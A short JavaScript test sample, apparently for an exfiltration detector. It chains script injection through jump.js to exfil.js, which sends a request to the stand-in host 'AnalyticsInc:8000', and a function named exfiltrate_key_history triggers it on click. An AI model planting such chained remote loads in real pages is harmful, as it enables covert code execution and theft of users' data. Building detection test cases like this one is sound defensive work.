function exfiltrate_key_history() {

    // Remote Source 2 - Multiple Includes - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL = './jump.js';
    var script = document.createElement("script");
    script.src = URL;
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

/* 
jump.js contents:

var URL = 'http://AnalyticsInc:8000/exfil.js';
var script = document.createElement("script");
script.src = URL;
document.getElementsByTagName('head')[0].appendChild(script);

*/

/*
exfil.js contents:

xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=remote2", true);
xmlhttp.send(null);

*/
